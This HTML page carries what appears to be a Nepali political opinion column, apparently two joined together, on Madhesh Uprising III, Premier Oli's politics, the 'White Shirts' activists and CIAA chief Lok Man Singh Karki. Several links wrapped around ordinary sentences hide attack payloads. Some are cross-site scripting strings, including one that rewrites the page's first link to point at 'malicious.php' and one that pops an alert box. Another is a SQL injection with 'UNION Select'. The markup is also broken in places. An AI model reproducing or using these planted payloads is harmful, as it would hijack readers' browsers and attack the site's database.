<blockquote>The Indians first appropriated Madhesh Uprising III and then dumped it the moment they thought it had outlived its utility.</blockquote>


<p>
At least three tormenting tempests have hit teapots of the social cognoscenti in Kathmandu in recent days. Acclaimed orthopedic doctor and celebrated social healer Govinda KC resumed one of his periodic hunger strikes that he regularly undertakes to cleanse the medical education system.</p>
<p>
The game of musical chairs began once again at what was once the International Convention Center but now houses the unwieldy legislature of the country. And sales of green bangles began to skyrocket to mark the month of Mahadev—the presiding deity of abarnas (externalized castes) in the Hindu pantheon—as his female devotees decorated themselves with henna paste.</p>

<p>
<a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank"> 
Meanwhile, the silence</a> of the chattering classes over the alleged rape of a girl in Rupandehi reached deafening levels. Report of the Amnesty International recording vengefulness of law enforcement agencies in Kailali went almost unnoticed. Few in Kathmandu seem to know that more than five dozen people from Mahottari alone have been slapped with false charges and are living in self-exile across the border in India to escape arbitrary arrest or worse—staged encounters.
</p>
<p>
The self-proclaimed patriotic intelligentsia has almost forgotten that barely a year ago, the country was embroiled in an existential crisis that challenged the very notion of communally-charged nationalism, something akin to what historian Richard Hofstadter had called the “Paranoid Style” of politics in the American context in the mid-1960s. The PEON is convinced that their tenacity won the day and the challenge to their hegemony has passed. The conclusion is perhaps correct: History indeed mostly travels through the pipeline of state power. But social eruptions too are not that uncommon.
</p>
<p>
It’s impossible to raise questions over intent, resolve or means of KC’s single-minded mission to reform the medical education. Without people like him to save public conscience from time to time, societies turn infertile from the lack of redemptive irrigation of the collective soul. The problem with his undertaking is the complete absence of a larger political purpose and an appropriate organization. Even Mahatma Gandhi needed the vehicle called Indian National Congress and Jawaharlal Nehru to steer its course.
</p>

The White Shirts that</a> tend to gather around KC are risk-averse group of weekend warriors indulging in ‘actorivism’ to champion fashionable issues. It was created to resist the people on behalf of the public. Occupy Wall Street gave birth to its copycat Occupy Baluwatar. Tax evasion by a profit-sector telecom service provider was the burning issue for a while. That has now cooled down considerably and lampooning Lok Man Singh Karki is the newest cool.
</p>
<p>
The next agenda of ‘actorivist’ volunteers will probably be global warming because, “Don’t you know dude, the climate change affects the poorest most.” Never doubt the ability of the bourgeoisie to manufacture a trendy topic to rally around. Their capacity to engineer desirable outcomes in the political economy for the long term, however, remains severely limited the world over.
</p>
<p>
Unless a critical mass of successful professionals are willing to put their careers on the line to pursue causes dear to their smartphone thumbs, the risk of KC becoming another Nand Prasad—the grieving father of Gorkha who starved himself to death in search of justice for his murdered son—shall remain high.</p>
<p><b>Sectarian snarl</b></p>
<p>
The hubbub over the change of government is even more pointless. Premier Khadga Prasad Sharma Oli may have stayed in the position of supreme authority for only about two years—first as the de facto leader of the Khas-Arya (Khaa for short) community when Premier Sushil Koirala nominally presided over the government and then the de jure Prime Minister of the country—but he has destroyed generations through his politics of the paranoid. Premier Oli has institutionalized what can perhaps be called ‘Khaabad’ in Nepali or merely ‘Oliology’ in English to allude to the first and last names of its proponent.
</p>
<p>
In plain terms, Oliology is a bigoted system of beliefs that contains the worst of majoritarian communalism, crony capitalism, vacuous chauvinism and opportunistic oligarchy and then seeks to ‘otherize’ Madheshis as internal threats and Indians as external enemies for the continuation of the complete control of the Khas-Arya over the country that the community considers to be its fatherland. As long as that remains the ruling ideology, change of guards at Singh Durbar will imply seamless continuity. Musical chair is a boring game for onlookers.
</p>
<p>
The UML has long been wedded to Oliology, the current party chief merely codified its beliefs and gave it his name. The state of national emergency in the wake of Gorkha Earthquakes that devastated the mid-mountains provided Chairman Oli sufficient debris to sculpt the deity of majoritarian communalism. Without understanding Madhesh Uprising III that has unleashed several forces into the stagnating pond of Nepali politics, it’s impossible to loosen the hold of Oligarchy in the country.
</p>
<p>
While formulating the conspiratorial 16-Point settlement in June, 2015, the PEON perhaps anticipated that there was going to be a backlash in Tarai-Madhesh. What it failed to foresee was the intensity of the uproar. Soon frightened, it closed its wagon even tighter and let the storm blow over in the name of resisting supposed Indian expansionism and outside interference in internal affairs.
</p>
<p>
<a href="http://www.theplanetreports.com/comments.php?sig=<script>alert('No+more+entries+Possible+')%3B<%2Fscript>"target="_blank">
Border blockages gave </a> a convenient cover to hide behind mechanically chanted slogans of sovereignty, integrity and independence. In fact, all such cherished values shall remain at risk if positive processes of Madhesh Uprising III are allowed to waste and issues raised during the popular movement are left unaddressed.
</p>
<p><b>Uncritical masses</b></p>
<p>
Almost all postulates of political movements failed the test of Madhesh Uprising III. According to critical mass hypothesis, it is usually assumed that when about three percent of the population of a region pours out into the streets, the ruling regime is paralyzed into inaction and resolution becomes the only option of retaining its authority. The supposition probably comes from the belief that brutal suppression can be ruled out when security forces have their family members among protestors, which is inevitable when three percent of population are on the direct line of fire.</p>
<p>
Even when the postulated threshold was repeatedly crossed in Tarai-Madhesh, security forces had no hesitation in shooting the ‘otherized’ people of what perhaps appeared to them like occupied territories. Exclusionary composition of law enforcement agencies is a permanent threat to the national unity and political stability of any multi-ethnic country.</p>
<p>
Observers usually give three months to any political campaign to create a stir in society. After that period, protestors start to get constant media attention. The so-called international community begins to exercise its influence. The public intellectuals are shaken out of their habitual stupor.</p>
<p>
None of it worked even when Madhesh Uprising remained relentlessly on course between June, 2015 and February, 2016 for almost nine months and then has continued sporadically ever since.</p>
<p>
The composition of the newsroom in Nepal is even more monoethnic than its security forces. Almost the same holds true for what are called the public intellectuals serenading readers from op-ed pages and exhorting prime-time audience to patriotic duty. Together, they miserably failed to speak truth to power or hold the government accountable. Even though feeble, the media and the civil society had performed much better in 1989-90 when the country had to face a real trade blockade along the entire Indo-Nepal border for much longer.
</p>
<p>
The international community was complicit in the conspiracy of formulating a constitution—any kind of constitution—in the hope of giving the status quo legitimate continuity. The Americans, the Scandinavians, the Swiss, the Germans, the Japanese and even Russians: Their unspoken priority was to tame the Maoists in the name of mainstreaming them. Madheshis were supposed to have been the headache of Indians. The Chinese kept a bemused watch over the unfolding situation and patiently waited to appropriate the winner.
</p>
<p>
The Indians, as is their wont, waited till the last moment for their appeasement overtures to work its magic upon the PEON, which disdainfully dismissed their pacification policies as diplomatic feebleness. In desperation, they appropriated the Madhesh Uprising III temporarily and then dumped the moment they thought it had outlived its utility.
</p>
<p>
Any political movement inevitably gives rise to subaltern solidarity. That postulate of popular movements remains to be tested. The future of Madhesh, and the country by extension, will be decided by the bond that evolves between the Pahadi Janjatis, the downtrodden of the Khas-Aryas, and the Madheshis in the days to come.</p>

<blockquote>No matter how instable the polity is or how poor and ignorant the populace are, Nepal is accursed to wallow in its sovereign misery as long as the balance of power does not change. </blockquote>   


<a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank"> Just like the dress </a> 
and address, concerns of a person also reflect one’s class in an unmistakable manner. When members of the Upper Class meet, they talk about paucity of domestic help or the challenges of retaining skilled chauffeurs. The Middle Class has middling concerns: next EMI, school admissions, traffic snarls, quality of Chinese wines, and the best place for crusty pizza in town.</p>

<p>The Working Class is perpetually on the lookout for a visa to anywhere in the world to escape the tedium of remaining in the same place despite running nonstop. The Under Class has no time to worry—it survives and vents its frustrations by cursing either the fate or the politicians.
</p>

<p>In between the Upper and the Middle above and the Working and the Under below, there is a thin band of salaried professionals, self-employed specialist, skilled entrepreneurs and the rentier bourgeoisie that form the Comfortable Class (CC) with enough leisure at hand to engage itself with common concerns. The Kathmandu CC is obsessed with conspiracy theories with imminent villains and eminent saviors that are mostly of its own making.
</p>

<p>Most, though admittedly not all, White Shirts (WS, pronounced Dabloos) come from the CC background. Analogous to the Yellow Shirts of Thailand in its composition, beliefs and concerns, the Dabloos of Nepal form a cohort of weekend warriors that constantly need a recognizable figure of hate to channel its negative energy. After 2008, Pushpa Kamal Dahal was the main villain. For a brief period, Baburam Bhattarai perfectly fitted the bill with his inclusive proclivities. They then discovered Rajendra Mahato with skin color and hirsute visage perfect for caricature.</p>
    
<p>The latest object of wrath is Lokman Singh Karki, head of a constitutional body that is designed to be much more than a mere watchdog. Any person with an iota of political ambition can easily turn the CIAA into a super government. And that precisely is the conspiracy theory doing the rounds of CCs in general and Dabloos in particular.

The rumor doing the Dabloo rounds is that the ‘foreign forces’ are plotting to subvert the system and preparing for another extra-constitutional government under proposed President Khil Raj Regmi and presumptuous Premier LSK to prepare yet another constitution! It’s in the character of rumors that the more farfetched the insinuation, the more plausible it sounds.</p>
<p>

<a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three">
It may appear like pop psychology and intuitive sociology,</a> but beliefs, values, behaviour patterns, and ways of living of a cohort are born out of circumstances of political economy of its formative years. Most of Dabloos belong to the Referendum Generation and were born and brought up after 1975—the year of coronation of foreign-educated monarch. The Chief Commissioner LSK honed his manipulative skills precisely during this period.

Writing about circumstances leading to the rise of Napoleon Bonaparte, “the king of the French Revolution”, historian François Furet notes, “In 1789, the French had created a Republic, under the name of a monarchy. Ten years later, they created a monarchy, under the name of a Republic.” Does Nepal really run the risk of rise of Caesarism? The answer probably needs a careful evaluation of country’s geopolitical and socioeconomic compulsions. </p>

<p><b>Contested context</b></p>
<p> It’s in the nature of history that it never lets go of its grip over the collective imagination. Starting with the military campaigns of Gorkhali warriors till the Treaty of Sugauli in 1814-16, the emergence of Khas strongman Jang Bahadur Kunwar in 1846, and the brief interlude of democracy between 1950 and 1960 followed by the royal-military coup, each historic episode has helped shape the self-definition of the Nepali people.

<a href="http://www.theplanetreports.com/comments.php?sig=<script>alert('No+more+entries+Possible+')%3B<%2Fscript>"target="_blank"> However, by virtue of its </a> comprehensiveness, the Referendum of 1980 continues to be the cataclysmic event that confined the idea of being a Nepali into a narrow quadrant of egocentrism, ethnocentrism, xenophobia and McCarthyism. The chain of events in the wake of Referendum strengthened the self-perception of ‘patriotic’ Nepalis as being constantly at the risk of losing its identity. The aggressiveness of nationalists comes from fears that have little base in reality.

Even though rigged, the result of the plebiscite conferred post-facto legitimacy upon the royal-military coup of 1960 that King Mahendra had staged to concentrate state powers in the institution of monarchy. It established the centrality of the king in public life and made a leader of BP Koirala’s stature proclaim publicly that the future of Nepali nationality was inextricably intertwined with the fate of monarchy. Sacredness of military was its natural corollary with the Supreme Commander-in-Chief as the ultimate protector of national interest.

Emboldened by results of plebiscite, King Birendra began to take steps that continue to confront the country even after the overthrow of monarchy.

On the domestic front, monarchical minions came up with the report of the Task Force on Internal and International Migration—the so-called Harka Gurung Report—that sought to ‘otherize’ all Madheshis and misrepresented the demographic fact that most migration into the Madhesh was from hills and mountains rather than from across the border.

On the international front, King Birendra put the geostrategic kingdom firmly in the Western Camp of Cold War and irked New Delhi by vigorously pursuing his “Zone of Peace” vision as the single-point agenda of foreign policy mission. Based on the Nixon Doctrine, Maoists were allies to be used against Marxists. By the end of the decade, he was buying anti-aircraft guns from China and provoking India at international forums to see how far he could go in exercising his sovereignty.

Nepal soon discovered that the right of access to the sea for landlocked countries read well only on paper; in practice, it continues to be a concession that has to be earned at the cost of continuous loyalty. In international relations, there indeed are no friends or foes; the only reality is the clash, negotiation, and resolution of conflicting interests.
<p>
When King Birendra handed over the administration to the political parties in 1990, Nepal had begun to show all symptoms of what political scientist Robert Jackson had called a “disintegrating state”. In the early-1990, Nepal indeed lacked “the characteristics of a common public realm” and the state of the state was such that the state offices possessed uncertain authority, government organizations were ineffective and plagued by corruption, and the political community was highly segmented ethnically into several ‘publics’ rather than one collective with shared imagination of national identity. Jackson’s other criteria—“corruption and incompetence infiltrate virtually every agency of government, not merely hampering but in most cases undermining state autonomy and capacity”—were even more visible.</p>
<p>
However, not all disintegrating states ultimately fall apart. Once again, Jackson gives the reason. The constitutive norm of sovereignty in the international system allows states with virtually no capacity to effectively govern itself to exist and function. This is what from political scientist Leo E Rose to jurist Ganesh Raj Sharma have cited as the main reason for the continued independence and sovereignty of a country as ungovernable as Nepal.</p>

No matter how instable the polity is or how poor and ignorant the populace are, Nepal is accursed to wallow in its sovereign misery as long as the balance of power does not change in the Himalayan region. The fears of ‘US imperialism’, ‘Indian expansionism’ or ‘Chinese embrace’ have all been equally exaggerated to say the least.

<p><b>Designed malfunction</b></p>
Even though the risks to the integrity of the country are entirely internal, external forces can’t be kept out in the name of sovereignty in the modern world. Like the extra-constitutional government of KRR, LSK is more of a product rather than the producer of the political drama of 2013-14 and the divisive ‘constitution’ it ultimately came up with.
<p>
More than everybody else, LSK knows the role he played to marginalize Madheshis and cut Maoists down to size with the help of the administration and security forces at the behest of the PEON. He also knows that Dabloos are direct beneficiaries of his shenanigans. There is a reason KRR as the Chairman of the council created to conduct elections had claimed that without LSK he wouldn’t be able to deliver expected results. It’s easy to be an idealist, but the fact is that LSK is the keystone of the PEON arch: Pull him out forcefully and the whole post-2013 structure will begin to crumble.</p>
<p>
The more practical option is to limit CIAA’s role into investigations. Absolute power is prone to absolute misuse. LSK’s predecessor was no angel and his successors are unlikely to fall from heavens. Lawmakers need to ignore the Dabloos and concentrate on constitutional amendments to control their Frankenstein.</p>
